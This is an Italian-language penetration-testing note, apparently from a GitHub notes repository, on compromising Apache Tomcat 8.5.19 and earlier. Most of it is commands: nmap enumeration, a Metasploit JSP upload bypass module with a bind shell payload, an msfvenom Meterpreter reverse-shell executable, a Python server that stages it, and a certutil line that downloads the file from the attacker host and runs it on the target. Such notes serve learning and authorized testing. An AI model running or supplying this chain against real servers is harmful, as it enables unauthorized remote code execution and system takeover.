<a href="https://github.com/Gigidotexe/Penetration_Test_notes/blob/main/README.md"> Back </a>
# Apache Tomcat
**Apache Tomcat**, noto anche come **Tomcat server**, è un popolare servlet Java Web server gratuito e open source.  
È comunemente utilizzato per creare e ospitare siti web dinamici e applicazioni web basate su **Java**.

Utilizza il protocollo `HTTP` per facilitare la comunicazione tra client e server, e generalmente è in esecuzione sulla **porta 8080**, a differenza di server come Apache HTTP Server o NGINX che operano tipicamente sulle porte `80` (HTTP) e `443` (HTTPS).

---

## Differenza tra Apache e Apache Tomcat

- **Apache HTTP Server** è un web server utilizzato per ospitare **siti web statici e dinamici**, tipicamente sviluppati in linguaggi come **PHP o HTML**.
- **Apache Tomcat**, invece, è specificamente pensato per **ospitare applicazioni web basate su Java**, come servlet e JSP (Java Server Pages).

---

## Vulnerabilità di Apache Tomcat

Le versioni di **Apache Tomcat v8.5.19** e precedenti sono vulnerabili all’**esecuzione remota di codice (RCE)**.  
Un attaccante può sfruttare questa vulnerabilità per **caricare ed eseguire un payload JSP**, ottenendo così **accesso remoto** al server target.

---

## Scanning e Enumeration

Esegui una scansione con `nmap` per individuare se Apache Tomcat è in esecuzione:

```bash
nmap -p 8080 -sV <IP>
```

Se sulla porta `8080` viene rilevato Apache Tomcat, verifica manualmente con il browser se è attivo un sito web o una web app accedendo all’indirizzo:

```
http://<IP>:8080
```

---

## Exploitation

Una volta confermata la presenza del servizio vulnerabile, è possibile utilizzare il modulo Metasploit:

```bash
use exploit/multi/http/tomcat_jsp_upload_bypass
```

Imposta il payload:

```bash
set payload java/jsp_shell_bind_tcp
```

Definisci la shell da usare in base al sistema operativo:

```bash
set SHELL cmd   # se il target è Windows
set SHELL bash  # se il target è Linux
```

> Questo exploit può richiedere più tentativi prima di avere successo. Se tutto va a buon fine, otterrai una shell sul sistema target.

---

## Migrazione a Meterpreter

Poiché non è possibile effettuare un upgrade di questa shell, è possibile risolvere questo problema generando un payload `Meterpreter` con **Msfvenom**:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > meterpreter.exe
```
Successivamente apriamo un listener in Metasploit:
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
run
```
Nel frattempo, avvia un server HTTP per fornire il file al target:
```bash
sudo python3 -m http.server 80
```

---

## Caricamento del Payload sul Target
Accedi alla shell del target (ottenuta tramite lo JSP shell), quindi usa la utility `certutil` per scaricare il file:
```bash
certutil -urlcache -f http://<IP_Kali>/meterpreter.exe meterpreter.exe
```
Una volta scaricato con successo il payload, eseguilo:
```bash
meterpreter.exe
```
Il listener di Metasploit riceverà la connessione e aprirà una sessione `Meterpreter`, che può essere utilizzata per ulteriori operazioni di post-exploitation.

## Identificazione del Servizio
Il primo passo é quello di verificare che servizio é in esecuzione sulla macchina target.

---
